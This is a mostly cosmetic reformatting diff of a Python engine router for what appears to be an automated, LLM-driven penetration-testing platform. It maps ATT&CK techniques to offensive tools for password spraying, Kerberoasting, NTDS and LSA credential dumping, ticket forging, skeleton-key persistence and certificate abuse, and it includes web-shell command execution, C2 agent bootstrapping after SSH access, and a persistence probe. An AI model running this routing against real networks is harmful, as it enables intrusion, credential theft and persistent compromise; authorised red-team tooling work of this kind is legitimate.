@@ -63,39 +63,51 @@ def _is_auth_failure(error: str | None) -> bool:
 # can still proceed if valid credentials exist. This is a cross-category
 # fallback and should be documented in an ADR amendment.
 _FALLBACK_CHAIN: dict[str, list[str]] = {
-    "mcp_ssh":    ["c2"],
-    "metasploit": ["mcp_ssh"],   # Relaxed from SPEC-040: msf down -> try SSH
-    "c2":         ["mcp_ssh"],
-    "mcp_recon":  [],      # no fallback — recon either works or it doesn't
-    "mcp_ad":     [],      # AD MCP tools: no fallback (specialized tooling)
+    "mcp_ssh": ["c2"],
+    "metasploit": ["mcp_ssh"],  # Relaxed from SPEC-040: msf down -> try SSH
+    "c2": ["mcp_ssh"],
+    "mcp_recon": [],  # no fallback — recon either works or it doesn't
+    "mcp_ad": [],  # AD MCP tools: no fallback (specialized tooling)
 }
 
-_RECON_TECHNIQUE_PREFIXES: frozenset[str] = frozenset({
-    "T1595",  # Active Scanning
-    "T1590",  # Gather Victim Network Information
-    "T1592",  # Gather Victim Host Information
-    "T1046",  # Network Service Discovery
-    "T1018",  # Remote System Discovery
-    "T1135",  # Network Share Discovery
-})
+_RECON_TECHNIQUE_PREFIXES: frozenset[str] = frozenset(
+    {
+        "T1595",  # Active Scanning
+        "T1590",  # Gather Victim Network Information
+        "T1592",  # Gather Victim Host Information
+        "T1046",  # Network Service Discovery
+        "T1018",  # Remote System Discovery
+        "T1135",  # Network Share Discovery
+    }
+)
 
 # SPEC-052: Initial Access techniques routed to InitialAccessEngine
-_INITIAL_ACCESS_TECHNIQUE_PREFIXES: frozenset[str] = frozenset({
-    "T1110",  # Brute Force
-    "T1078",  # Valid Accounts
-})
+_INITIAL_ACCESS_TECHNIQUE_PREFIXES: frozenset[str] = frozenset(
+    {
+        "T1110",  # Brute Force
+        "T1078",  # Valid Accounts
+    }
+)
 
 # ADR-048: Web exploit techniques routed to MCP web-scanner
-_WEB_EXPLOIT_TECHNIQUES: frozenset[str] = frozenset({
-    "T1190",     # Exploit Public-Facing Application (SSRF variant)
-    "T1078.004", # Valid Accounts: Cloud Accounts
-    "T1530",     # Data from Cloud Storage Object
-})
+_WEB_EXPLOIT_TECHNIQUES: frozenset[str] = frozenset(
+    {
+        "T1190",  # Exploit Public-Facing Application (SSRF variant)
+        "T1078.004",  # Valid Accounts: Cloud Accounts
+        "T1530",  # Data from Cloud Storage Object
+    }
+)
 
 # ADR-048: SSRF proxy indicator keywords in fact values
 _SSRF_PROXY_KEYWORDS: tuple[str, ...] = (
-    "proxy", "redirect", "url=", "fetch=", "ssrf",
-    "dest=", "path=", "forward=",
+    "proxy",
+    "redirect",
+    "url=",
+    "fetch=",
+    "ssrf",
+    "dest=",
+    "path=",
+    "forward=",
 )
 
 
@@ -134,17 +146,17 @@ def _is_valid_iam_role_name(name: str) -> bool:
 # ---------------------------------------------------------------------------
 _AD_TECHNIQUE_TO_MCP: dict[str, tuple[str, str]] = {
     "T1087.002": ("bloodhound-collector", "bloodhound_collect"),
-    "T1482":     ("bloodhound-collector", "bloodhound_enum_trusts"),
+    "T1482": ("bloodhound-collector", "bloodhound_enum_trusts"),
     "T1110.003": ("netexec-suite", "netexec_password_spray"),
-    "T1021.002": ("netexec-suite", "netexec_exec"),   # SMBExec / WMIExec lateral move
-    "T1021.006": ("netexec-suite", "netexec_exec"),   # WinRM lateral move via netexec
+    "T1021.002": ("netexec-suite", "netexec_exec"),  # SMBExec / WMIExec lateral move
+    "T1021.006": ("netexec-suite", "netexec_exec"),  # WinRM lateral move via netexec
     "T1558.003": ("credential-dumper", "kerberoast"),
     "T1558.004": ("impacket-ad", "asrep_roast"),  # AS-REP Roast — zero-credential anonymous KDC query
     "T1003.002": ("credential-dumper", "dump_sam_hashes"),
     "T1003.003": ("credential-dumper", "dump_ntds"),
     "T1003.004": ("credential-dumper", "dump_lsa_secrets"),
     "T1557.001": ("responder-capture", "responder_start"),
-    "T1187":     ("coercion-tools", "coerce_petitpotam"),
+    "T1187": ("coercion-tools", "coerce_petitpotam"),
     "T1558.001": ("impacket-ad", "impacket_golden_ticket"),
     "T1558.002": ("impacket-ad", "impacket_silver_ticket"),
     "T1550.003": ("impacket-ad", "impacket_get_tgt"),
@@ -154,24 +166,34 @@ _AD_TECHNIQUE_TO_MCP: dict[str, tuple[str, str]] = {
     "T1556.001": ("ad-persistence", "persist_skeleton_key"),
     "T1547.005": ("ad-persistence", "persist_custom_ssp"),
     "T1110.002": ("hashcat-crack", "hashcat_crack_kerberoast"),
-    "T1649":     ("certipy-ad", "certipy_request"),  # ESC1 cert request as arbitrary UPN
-    "T1550.003": ("certipy-ad", "certipy_auth"),     # PKINIT auth with PFX → DA TGT + NTLM hash
+    "T1649": ("certipy-ad", "certipy_request"),  # ESC1 cert request as arbitrary UPN
+    "T1550.003": ("certipy-ad", "certipy_auth"),  # PKINIT auth with PFX → DA TGT + NTLM hash
 }
 
 # AD techniques that REQUIRE a credential fact — abort early with prereq_missing if none available
-_AD_TECHNIQUES_REQUIRE_CRED: frozenset[str] = frozenset({
-    "T1087.002",   # bloodhound_collect needs domain cred
-    "T1482",       # bloodhound_enum_trusts needs domain cred
-    "T1021.002", "T1021.006",  # lateral move needs valid creds
-    "T1558.003",   # kerberoast needs a low-priv domain user to request tickets
-    # T1558.004 intentionally EXCLUDED — AS-REP Roast uses zero-credential anonymous KDC query
-    "T1003.002", "T1003.003", "T1003.004",  # credential dumping needs admin
-    "T1558.001", "T1558.002", "T1550.003",  # ticket forge/get needs creds
-    "T1222.001", "T1484.001", "T1134.005",  # ACL/GPO/SID abuse needs creds
-    "T1556.001", "T1547.005",               # persistence needs DA
-    "T1110.002",   # hashcat needs a hash already collected
-    "T1649",       # certipy_request (ESC1) needs a cracked low-priv cleartext cred
-})
+_AD_TECHNIQUES_REQUIRE_CRED: frozenset[str] = frozenset(
+    {
+        "T1087.002",  # bloodhound_collect needs domain cred
+        "T1482",  # bloodhound_enum_trusts needs domain cred
+        "T1021.002",
+        "T1021.006",  # lateral move needs valid creds
+        "T1558.003",  # kerberoast needs a low-priv domain user to request tickets
+        # T1558.004 intentionally EXCLUDED — AS-REP Roast uses zero-credential anonymous KDC query
+        "T1003.002",
+        "T1003.003",
+        "T1003.004",  # credential dumping needs admin
+        "T1558.001",
+        "T1558.002",
+        "T1550.003",  # ticket forge/get needs creds
+        "T1222.001",
+        "T1484.001",
+        "T1134.005",  # ACL/GPO/SID abuse needs creds
+        "T1556.001",
+        "T1547.005",  # persistence needs DA
+        "T1110.002",  # hashcat needs a hash already collected
+        "T1649",  # certipy_request (ESC1) needs a cracked low-priv cleartext cred
+    }
+)
 
 _TERMINAL_ERRORS: list[str] = [
     "scope violation",
@@ -232,24 +254,30 @@ def _classify_failure(error: "str | None", engine: str) -> str:
     lower = error.lower()
 
     # auth failures (check before generic "failed" matches)
-    if any(k in lower for k in (
-        "all ssh credentials failed",
-        "all protocols failed",
-        "permission denied",
-        "login fail",
-        "authentication fail",
-        "credential rejected",
-    )):
+    if any(
+        k in lower
+        for k in (
+            "all ssh credentials failed",
+            "all protocols failed",
+            "permission denied",
+            "login fail",
+            "authentication fail",
+            "credential rejected",
+        )
+    ):
         return "auth_failure"
 
     # service reachability (network layer)
-    if any(k in lower for k in (
-        "connection refused",
-        "no route",
-        "unreachable",
-        "no targetable services",
-        "host is down",
-    )):
+    if any(
+        k in lower
+        for k in (
+            "connection refused",
+            "no route",
+            "unreachable",
+            "no targetable services",
+            "host is down",
+        )
+    ):
         return "service_unreachable"
 
     # exploit engine failed to obtain a session
@@ -259,11 +287,14 @@ def _classify_failure(error: "str | None", engine: str) -> str:
     # MCP / tool schema errors — check before "timeout" so that tool
     # pydantic errors containing the word "timeout" in a field name don't
     # miscategorise.
-    if any(k in lower for k in (
-        "validation error",
-        "field required",
-        "tool not found",
-    )):
+    if any(
+        k in lower
+        for k in (
+            "validation error",
+            "field required",
+            "tool not found",
+        )
+    ):
         return "tool_error"
 
     # privilege insufficiency
@@ -271,12 +302,15 @@ def _classify_failure(error: "str | None", engine: str) -> str:
         return "privilege_insufficient"
 
     # prerequisite missing (fact / credential / agent)
-    if any(k in lower for k in (
-        "prerequisite missing",
-        "no credential",
-        "no agent",
-        "precondition",
-    )):
+    if any(
+        k in lower
+        for k in (
+            "prerequisite missing",
+            "no credential",
+            "no agent",
+            "precondition",
+        )
+    ):
         return "prerequisite_missing"
 
     # pure timeout (not a metasploit "no session within Ns" which is
@@ -304,8 +338,13 @@ class EngineRouter:
         self._mcp_engine = mcp_engine
 
     async def execute(
-        self, db: asyncpg.Connection, technique_id: str, target_id: str,
-        engine: str, operation_id: str, ooda_iteration_id: str | None = None,
+        self,
+        db: asyncpg.Connection,
+        technique_id: str,
+        target_id: str,
+        engine: str,
+        operation_id: str,
+        ooda_iteration_id: str | None = None,
     ) -> dict:
         """Execute with automatic engine fallback (SPEC-040).
 
@@ -318,7 +357,12 @@ class EngineRouter:
 
         # Try primary engine
         result = await self._execute_single(
-            db, technique_id, target_id, engine, operation_id, ooda_iteration_id,
+            db,
+            technique_id,
+            target_id,
+            engine,
+            operation_id,
+            ooda_iteration_id,
         )
 
         # Success or terminal error -> return directly
@@ -328,49 +372,61 @@ class EngineRouter:
             return result
 
         # Record primary engine failure
-        fallback_history.append({
-            "engine": engine,
-            "error": result.get("error"),
-        })
+        fallback_history.append(
+            {
+                "engine": engine,
+                "error": result.get("error"),
+            }
+        )
 
         # Try fallback engines in order
         fallback_engines = _FALLBACK_CHAIN.get(engine, [])
         for attempt, fallback_engine in enumerate(fallback_engines, start=1):
             # Broadcast fallback event
-            await self._ws.broadcast(operation_id, "execution.fallback", {
-                "execution_id": result.get("execution_id"),
-                "technique_id": technique_id,
-                "failed_engine": fallback_history[-1]["engine"],
-                "fallback_engine": fallback_engine,
-                "failed_error": fallback_history[-1]["error"],
-                "attempt": attempt,
-                "max_attempts": len(fallback_engines),
-            })
+            await self._ws.broadcast(
+                operation_id,
+                "execution.fallback",
+                {
+                    "execution_id": result.get("execution_id"),
+                    "technique_id": technique_id,
+                    "failed_engine": fallback_history[-1]["engine"],
+                    "fallback_engine": fallback_engine,
+                    "failed_error": fallback_history[-1]["error"],
+                    "attempt": attempt,
+                    "max_attempts": len(fallback_engines),
+                },
+            )
 
             logger.info(
                 "Fallback attempt %d/%d: %s -> %s for technique %s",
-                attempt, len(fallback_engines),
+                attempt,
+                len(fallback_engines),
                 fallback_history[-1]["engine"],
-                fallback_engine, technique_id,
+                fallback_engine,
+                technique_id,
             )
 
             result = await self._execute_single(
-                db, technique_id, target_id, fallback_engine,
-                operation_id, ooda_iteration_id,
+                db,
+                technique_id,
+                target_id,
+                fallback_engine,
+                operation_id,
+                ooda_iteration_id,
             )
 
-            if result.get("status") == "success" or _is_terminal_error(
-                result.get("error")
-            ):
+            if result.get("status") == "success" or _is_terminal_error(result.get("error")):
                 result["fallback_history"] = fallback_history
                 result["final_engine"] = result.get("engine", fallback_engine)
                 return result
 
             # Record fallback failure
-            fallback_history.append({
-                "engine": fallback_engine,
-                "error": result.get("error"),
-            })
+            fallback_history.append(
+                {
+                    "engine": fallback_engine,
+                    "error": result.get("error"),
+                }
+            )
 
         # All engines failed — log why no further fallback is possible
         tried = [h["engine"] for h in fallback_history]
@@ -378,13 +434,15 @@ class EngineRouter:
             logger.warning(
                 "All same-category fallback engines exhausted for technique %s "
                 "(tried: %s). No cross-category fallback attempted.",
-                technique_id, " -> ".join(tried),
+                technique_id,
+                " -> ".join(tried),
             )
         else:
             logger.warning(
                 "Engine '%s' has no same-category fallback for technique %s. "
                 "Execution failed without fallback attempt.",
-                engine, technique_id,
+                engine,
+                technique_id,
             )
         result["fallback_history"] = fallback_history
         result["final_engine"] = result.get(
@@ -394,8 +452,13 @@ class EngineRouter:
         return result
 
     async def _execute_single(
-        self, db: asyncpg.Connection, technique_id: str, target_id: str,
-        engine: str, operation_id: str, ooda_iteration_id: str | None = None,
+        self,
+        db: asyncpg.Connection,
+        technique_id: str,
+        target_id: str,
+        engine: str,
+        operation_id: str,
+        ooda_iteration_id: str | None = None,
     ) -> dict:
         """Execute a technique via a single engine (no fallback).
 
@@ -409,25 +472,34 @@ class EngineRouter:
 
         logger.info(
             "_execute_single ENTRY: technique=%s engine=%s target=%s",
-            technique_id, engine, target_id,
+            technique_id,
+            engine,
+            target_id,
         )
 
         # -- Direct MCP route: Orient LLM supplied mcp_tool="server:tool" in options --
         # Encoded by ooda_controller/agent_swarm as "mcp_direct:server:tool".
         # This lets new environments work without touching _AD_TECHNIQUE_TO_MCP.
         if engine.startswith("mcp_direct:") and settings.MCP_ENABLED and self._mcp_engine:
-            qualified_tool = engine[len("mcp_direct:"):]
+            qualified_tool = engine[len("mcp_direct:") :]
             logger.info("Direct MCP route: technique=%s tool=%s", technique_id, qualified_tool)
             try:
                 return await self._execute_via_ad_mcp(
-                    db, exec_id, now, technique_id, target_id,
-                    operation_id, ooda_iteration_id,
+                    db,
+                    exec_id,
+                    now,
+                    technique_id,
+                    target_id,
+                    operation_id,
+                    ooda_iteration_id,
                     mcp_qualified_name=qualified_tool,
                 )
             except Exception as exc:
                 logger.warning(
                     "mcp_direct route failed for %s (%s): %s — falling through to standard routing",
-                    technique_id, qualified_tool, exc,
+                    technique_id,
+                    qualified_tool,
+                    exc,
                 )
                 engine = "mcp"  # fall through to standard MCP routing
 
@@ -455,7 +527,11 @@ class EngineRouter:
         # when engine="mcp" it should route to web-scanner instead.
         if _is_web_exploit_technique(technique_id, engine) and settings.MCP_ENABLED and self._mcp_engine:
             return await self._execute_web_exploit_via_mcp(
-                db, technique_id, target_id, operation_id, ooda_iteration_id,
+                db,
+                technique_id,
+                target_id,
+                operation_id,
+                ooda_iteration_id,
             )
 
         # -- AD MCP route: must come BEFORE InitialAccessEngine check.
@@ -463,8 +539,13 @@ class EngineRouter:
         #    T1110.002 uses hashcat. Both are in _AD_TECHNIQUE_TO_MCP.
         if technique_id in _AD_TECHNIQUE_TO_MCP and settings.MCP_ENABLED and self._mcp_engine:
             return await self._execute_via_ad_mcp(
-                db, exec_id, now, technique_id, target_id,
-                operation_id, ooda_iteration_id,
+                db,
+                exec_id,
+                now,
+                technique_id,
+                target_id,
+                operation_id,
+                ooda_iteration_id,
             )
 
         # -- SPEC-057: PostgreSQL COPY-TO-PROGRAM route (T1505.004) --
@@ -482,8 +563,15 @@ class EngineRouter:
         # -- MCP route: engine == "mcp" (explicit tool-registry dispatch) --
         if engine == "mcp" and settings.MCP_ENABLED and self._mcp_engine:
             return await self._execute_mcp(
-                db, exec_id, now, ability_id, technique_id, target_id,
-                engine, operation_id, ooda_iteration_id,
+                db,
+                exec_id,
+                now,
+                ability_id,
+                technique_id,
+                target_id,
+                engine,
+                operation_id,
+                ooda_iteration_id,
             )
 
         # -- Explicit Metasploit route: engine == "metasploit" OR
@@ -500,13 +588,23 @@ class EngineRouter:
                 target_ip = await self._get_target_ip(db, target_id)
                 if target_ip:
                     return await self._execute_metasploit(
-                        db, exec_id, now, technique_id, target_id, operation_id,
-                        ooda_iteration_id, service, target_ip, "metasploit",
+                        db,
+                        exec_id,
+                        now,
+                        technique_id,
+                        target_id,
+                        operation_id,
+                        ooda_iteration_id,
+                        service,
+                        target_ip,
+                        "metasploit",
                     )
             logger.warning(
                 "engine=metasploit requested (or T1190 inferred) but no exploitable service found for %s "
                 "(engine=%s, technique=%s) -- falling through",
-                target_id, engine, technique_id,
+                target_id,
+                engine,
+                technique_id,
             )
 
         # -- Metasploit route: exploit=true CVE fact -> highest priority --
@@ -524,8 +622,16 @@ class EngineRouter:
                 )
             else:
                 return await self._execute_metasploit(
-                    db, exec_id, now, technique_id, target_id, operation_id,
-                    ooda_iteration_id, service, target_ip, engine,
+                    db,
+                    exec_id,
+                    now,
+                    technique_id,
+                    target_id,
+                    operation_id,
+                    ooda_iteration_id,
+                    service,
+                    target_ip,
+                    engine,
                 )
 
         # -- Engine selection --
@@ -535,37 +641,62 @@ class EngineRouter:
 
         if effective_mode == "mcp_ssh":
             return await self._execute_via_mcp_executor(
-                db, exec_id, now, ability_id, technique_id, target_id,
-                engine, operation_id, ooda_iteration_id,
+                db,
+                exec_id,
+                now,
+                ability_id,
+                technique_id,
+                target_id,
+                engine,
+                operation_id,
+                ooda_iteration_id,
             )
         elif effective_mode == "mock":
             return await self._execute_c2(
-                db, exec_id, now, ability_id, technique_id, target_id,
-                engine, operation_id, ooda_iteration_id, require_agent=False,
+                db,
+                exec_id,
+                now,
+                ability_id,
+                technique_id,
+                target_id,
+                engine,
+                operation_id,
+                ooda_iteration_id,
+                require_agent=False,
             )
         else:
             # "c2" mode -- original path with alive-agent requirement
             return await self._execute_c2(
-                db, exec_id, now, ability_id, technique_id, target_id,
-                engine, operation_id, ooda_iteration_id, require_agent=True,
+                db,
+                exec_id,
+                now,
+                ability_id,
+                technique_id,
+                target_id,
+                engine,
+                operation_id,
+                ooda_iteration_id,
+                require_agent=True,
             )
 
     # -- Internal helpers --
 
     async def _execute_recon_via_mcp(
-        self, db, exec_id, now, technique_id, target_id,
-        operation_id, ooda_iteration_id
+        self, db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
     ) -> dict:
         """Route recon techniques directly to ReconEngine (no credentials needed)."""
         from app.services.recon_engine import ReconEngine
+
         try:
             result = await ReconEngine().scan(db, operation_id, target_id)
             facts_count = getattr(result, "facts_written", 0)
             if isinstance(result, dict):
                 facts_count = result.get("facts_written", 0)
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "mcp_recon",
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "mcp_recon",
                 "status": "success",
                 "result_summary": "Recon scan complete",
                 "facts_collected_count": facts_count,
@@ -574,14 +705,21 @@ class EngineRouter:
         except Exception as e:
             logger.exception("Recon via MCP failed for technique %s", technique_id)
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "mcp_recon",
-                "status": "failed", "error": str(e),
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "mcp_recon",
+                "status": "failed",
+                "error": str(e),
             }
 
     async def _execute_web_exploit_via_mcp(
-        self, db: asyncpg.Connection, technique_id: str, target_id: str,
-        operation_id: str, ooda_iteration_id: str | None,
+        self,
+        db: asyncpg.Connection,
+        technique_id: str,
+        target_id: str,
+        operation_id: str,
+        ooda_iteration_id: str | None,
     ) -> dict:
         """ADR-048: Route web exploit techniques to MCP web-scanner.
 
@@ -597,20 +735,29 @@ class EngineRouter:
             "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
             "engine, status, started_at) "
             "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
-            exec_id, technique_id, target_id, operation_id,
-            ooda_iteration_id, "mcp", now,
+            exec_id,
+            technique_id,
+            target_id,
+            operation_id,
+            ooda_iteration_id,
+            "mcp",
+            now,
         )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": "running", "engine": "mcp",
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": "running",
+                "engine": "mcp",
+            },
+        )
 
         # T1190 against Windows: try command-injection web shell first
         if technique_id == "T1190":
-            target_row = await db.fetchrow(
-                "SELECT ip_address, os FROM targets WHERE id = $1", target_id
-            )
+            target_row = await db.fetchrow("SELECT ip_address, os FROM targets WHERE id = $1", target_id)
             target_ip = target_row["ip_address"] if target_row else None
             target_os = (target_row["os"] or "").lower() if target_row else ""
             if target_ip and "windows" in target_os:
@@ -622,8 +769,13 @@ class EngineRouter:
                         params={"url": shell_url, "cmd": "whoami", "param": "cmd"},
                     )
                     final = await self._finalize_execution(
-                        db, exec_id, technique_id, target_id, "mcp",
-                        operation_id, result,
+                        db,
+                        exec_id,
+                        technique_id,
+                        target_id,
+                        "mcp",
+                        operation_id,
+                        result,
                     )
                     return final
                 except Exception as e:
@@ -650,6 +802,7 @@ class EngineRouter:
             body1 = raw
             try:
                 import json as _json
+
                 parsed = _json.loads(raw)
                 body1 = (parsed.get("raw_output") or "").strip()
             except (ValueError, TypeError, AttributeError):
@@ -665,30 +818,41 @@ class EngineRouter:
                     )
 
             final = await self._finalize_execution(
-                db, exec_id, technique_id, target_id, "mcp",
-                operation_id, result,
+                db,
+                exec_id,
+                technique_id,
+                target_id,
+                "mcp",
+                operation_id,
+                result,
             )
             return final
 
         except Exception as e:
-            logger.exception(
-                "Web exploit via MCP failed for technique %s", technique_id
-            )
+            logger.exception("Web exploit via MCP failed for technique %s", technique_id)
             failure_category = _classify_failure(str(e), "mcp")
             await db.execute(
                 "UPDATE technique_executions SET status = 'failed', "
                 "error_message = $1, failure_category = $2, completed_at = $3 "
                 "WHERE id = $4",
-                str(e), failure_category, datetime.now(timezone.utc), exec_id,
+                str(e),
+                failure_category,
+                datetime.now(timezone.utc),
+                exec_id,
             )
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "mcp",
-                "status": "failed", "error": str(e),
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "mcp",
+                "status": "failed",
+                "error": str(e),
             }
 
     async def _find_ssrf_proxy_url(
-        self, db: asyncpg.Connection, operation_id: str,
+        self,
+        db: asyncpg.Connection,
+        operation_id: str,
     ) -> str | None:
         """Find the most recent SSRF proxy/redirect URL from facts.
 
@@ -733,8 +897,14 @@ class EngineRouter:
         return None
 
     async def _execute_initial_access(
-        self, db, exec_id, now, technique_id, target_id,
-        operation_id, ooda_iteration_id,
+        self,
+        db,
+        exec_id,
+        now,
+        technique_id,
+        target_id,
+        operation_id,
+        ooda_iteration_id,
     ) -> dict:
         """SPEC-052: Route Initial Access techniques to InitialAccessEngine.
 
@@ -751,9 +921,12 @@ class EngineRouter:
             )
             if not target_row:
                 return {
-                    "execution_id": exec_id, "technique_id": technique_id,
-                    "target_id": target_id, "engine": "initial_access",
-                    "status": "failed", "error": "Target not found",
+                    "execution_id": exec_id,
+                    "technique_id": technique_id,
+                    "target_id": target_id,
+                    "engine": "initial_access",
+                    "status": "failed",
+                    "error": "Target not found",
                 }
 
             # Collect open port facts for the target — parse into {port, service} dicts
@@ -767,14 +940,16 @@ class EngineRouter:
                     "SELECT value FROM facts "
                     "WHERE source_target_id = $1 AND operation_id = $2 "
                     "AND trait = 'service.open_port'",
-                    target_id, operation_id,
+                    target_id,
+                    operation_id,
                 )
                 if port_facts:
                     break
                 if _retry < 2:
                     logger.warning(
-                        "SPEC-058: no service.open_port facts for target %s "
-                        "(attempt %d/3, retrying in 2s)", target_id, _retry + 1,
+                        "SPEC-058: no service.open_port facts for target %s (attempt %d/3, retrying in 2s)",
+                        target_id,
+                        _retry + 1,
                     )
                     await _asyncio.sleep(2)
 
@@ -805,9 +980,21 @@ class EngineRouter:
             )
 
             # Record technique execution — ia_result is InitialAccessResult dataclass
-            success = getattr(ia_result, "success", False) if not isinstance(ia_result, dict) else ia_result.get("success", False)
-            method = getattr(ia_result, "method", "unknown") if not isinstance(ia_result, dict) else ia_result.get("method", "unknown")
-            credential = getattr(ia_result, "credential", None) if not isinstance(ia_result, dict) else ia_result.get("credential")
+            success = (
+                getattr(ia_result, "success", False)
+                if not isinstance(ia_result, dict)
+                else ia_result.get("success", False)
+            )
+            method = (
+                getattr(ia_result, "method", "unknown")
+                if not isinstance(ia_result, dict)
+                else ia_result.get("method", "unknown")
+            )
+            credential = (
+                getattr(ia_result, "credential", None)
+                if not isinstance(ia_result, dict)
+                else ia_result.get("credential")
+            )
 
             status = "success" if success else "failed"
             summary = f"Initial access via {method}: {'success' if success else 'failed'}"
@@ -816,9 +1003,7 @@ class EngineRouter:
 
             # SPEC-053: classify IA failure so Orient sees structured reason
             error = getattr(ia_result, "error", None) if not isinstance(ia_result, dict) else ia_result.get("error")
-            failure_category = (
-                _classify_failure(error, "initial_access") if not success else None
-            )
+            failure_category = _classify_failure(error, "initial_access") if not success else None
 
             await db.execute(
                 "INSERT INTO technique_executions "
@@ -826,18 +1011,20 @@ class EngineRouter:
                 "result_summary, started_at, completed_at, ooda_iteration_id, "
                 "failure_category) "
                 "VALUES ($1, $2, $3, $4, 'initial_access', $5, $6, $7, $8, $9, $10)",
-                exec_id, technique_id, target_id, operation_id,
-                status, summary[:500], now, datetime.now(timezone.utc),
-                ooda_iteration_id, failure_category,
+                exec_id,
+                technique_id,
+                target_id,
+                operation_id,
+                status,
+                summary[:500],
+                now,
+                datetime.now(timezone.utc),
+                ooda_iteration_id,
+                failure_category,
             )
 
             # C2 bootstrap in Act phase (SPEC-052: moved from recon.py)
-            if (
-                success
-                and method == "ssh"
-                and credential
-                and settings.C2_BOOTSTRAP_ENABLED
-            ):
+            if success and method == "ssh" and credential and settings.C2_BOOTSTRAP_ENABLED:
                 try:
                     # Resolve parameters for bootstrap_c2_agent(ip, credential, c2_host)
                     target_ip = target_row["ip_address"] or ""
@@ -849,10 +1036,7 @@ class EngineRouter:
                         cred_tuple = (credential[0], credential[1])
                     else:
                         cred_tuple = (str(credential), "")
-                    c2_host = (
-                        settings.C2_AGENT_CALLBACK_URL
-                        or settings.C2_ENGINE_URL
-                    )
+                    c2_host = settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
                     bootstrap_result = await ia_engine.bootstrap_c2_agent(
                         ip=target_ip,
                         credential=cred_tuple,
@@ -868,8 +1052,10 @@ class EngineRouter:
                     logger.warning("C2 bootstrap failed in Act phase: %s", c2_exc)
 
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "initial_access",
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "initial_access",
                 "status": status,
                 "result_summary": summary,
                 "error": None if success else (error or "IA failed"),
@@ -878,9 +1064,12 @@ class EngineRouter:
         except Exception as e:
             logger.exception("Initial Access execution failed for technique %s", technique_id)
             return {
-                "execution_id": exec_id, "technique_id": technique_id,
-                "target_id": target_id, "engine": "initial_access",
-                "status": "failed", "error": str(e),
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "target_id": target_id,
+                "engine": "initial_access",
+                "status": "failed",
+                "error": str(e),
             }
 
     async def _execute_via_mcp_executor(
@@ -908,15 +1097,14 @@ class EngineRouter:
             "  WHEN 'credential.ssh_key' THEN 1 "
             "  ELSE 2 END "
             "LIMIT 1",
-            operation_id, target_id,
+            operation_id,
+            target_id,
         )
 
         if not cred_row:
             # SPEC-037 Phase 2: record the failure so Orient sees why Act failed
             error_msg = f"No valid credentials -- all invalidated for target {target_id}"
-            logger.warning(
-                "No credentials for target %s in operation %s", target_id, operation_id
-            )
+            logger.warning("No credentials for target %s in operation %s", target_id, operation_id)
             # SPEC-053: no cred == prerequisite missing for Orient pivot logic
             await db.execute(
                 "INSERT INTO technique_executions "
@@ -924,8 +1112,15 @@ class EngineRouter:
                 "engine, status, started_at, completed_at, error_message, "
                 "failure_category) "
                 "VALUES ($1, $2, $3, $4, $5, $6, 'failed', $7, $8, $9, $10)",
-                exec_id, technique_id, target_id, operation_id,
-                ooda_iteration_id, "mcp_ssh", now, now, error_msg,
+                exec_id,
+                technique_id,
+                target_id,
+                operation_id,
+                ooda_iteration_id,
+                "mcp_ssh",
+                now,
+                now,
+                error_msg,
                 "prerequisite_missing",
             )
             return {
@@ -949,14 +1144,25 @@ class EngineRouter:
             "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
             "engine, status, started_at) "
             "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
-            exec_id, technique_id, target_id, operation_id,
-            ooda_iteration_id, "mcp_ssh", now,
+            exec_id,
+            technique_id,
+            target_id,
+            operation_id,
+            ooda_iteration_id,
+            "mcp_ssh",
+            now,
         )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": "running", "engine": "mcp_ssh",
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": "running",
+                "engine": "mcp_ssh",
+            },
+        )
 
         platform = "windows" if protocol == "winrm" else "linux"
         output_parser = await self._get_output_parser(db, technique_id, platform=platform)
@@ -990,18 +1196,23 @@ class EngineRouter:
         )
 
         final = await self._finalize_execution(
-            db, exec_id, technique_id, target_id, "mcp_ssh",
-            operation_id, result,
+            db,
+            exec_id,
+            technique_id,
+            target_id,
+            "mcp_ssh",
+            operation_id,
+            result,
         )
         if final.get("status") == "success":
             await self._mark_target_compromised(db, target_id, result.output, protocol=protocol)
         if settings.PERSISTENCE_ENABLED and final.get("status") == "success" and cred_row:
-            from app.services.persistence_engine import PersistenceEngine  # noqa: PLC0415
-            from app.database import get_pool  # noqa: PLC0415
             import asyncio  # noqa: PLC0415
-            asyncio.create_task(
-                PersistenceEngine().probe(get_pool, operation_id, target_id, cred_row["value"])
-            )
+
+            from app.database import get_pool  # noqa: PLC0415
+            from app.services.persistence_engine import PersistenceEngine  # noqa: PLC0415
+
+            asyncio.create_task(PersistenceEngine().probe(get_pool, operation_id, target_id, cred_row["value"]))
         return final
 
     async def _execute_via_ad_mcp(
@@ -1032,14 +1243,25 @@ class EngineRouter:
             "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
             "engine, status, started_at) "
             "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
-            exec_id, technique_id, target_id, operation_id,
-            ooda_iteration_id, "mcp_ad", now,
+            exec_id,
+            technique_id,
+            target_id,
+            operation_id,
+            ooda_iteration_id,
+            "mcp_ad",
+            now,
         )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
